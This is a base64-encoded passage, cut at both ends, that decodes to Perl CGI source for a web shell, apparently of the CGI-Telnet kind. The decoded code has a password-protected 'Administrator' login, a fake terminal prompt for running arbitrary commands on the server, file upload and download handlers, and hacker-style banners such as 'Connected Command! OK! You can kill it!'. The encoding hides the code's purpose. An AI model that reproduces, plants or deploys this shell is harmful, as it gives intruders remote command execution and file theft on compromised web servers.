48YnI+DQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBDaGVja2luZyBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KDQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD5cJCBDb25uZWN0ZWQgQ29tbWFuZCEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+DQo8L3RyPg0KPC90Ym9keT48L3RhYmxlPg0KPGJyPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsNClR5cGluZ1RleHQucnVuQWxsKCk7DQoNCjwvc2NyaXB0Pg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii4kcGF0aC4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NCg0KUGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NClBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIzY2ZmY2Nic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIG5hbWU9ImMiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQidHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+T3ZlcndyaXRlIGlmIGl0IEV4aXN0czwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KDQo8L2Zvcm0+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlyZXR1cm4gPDxFTkQ7DQo8L3RleHRhcmVhPg0KPGJyPjxmb250IGNvbG9yPXllbGxvdz4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+DQo8YnI+PGZvbnQgc2l6ZT0nNicgY29sb3I9cmVkPktpbGxlZCBpdCE8L2ZvbnQ+DQpFTkQNCgl9DQp9DQoNCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRyZXN1bHQgLj0gPDxFTkQ7DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPg0KRU5EDQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOw0KCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCW15ICRyZXN1bHQgPSAiIjsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJHJlc3VsdCAuPSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQlyZXR1cm4gJlByaW50Rm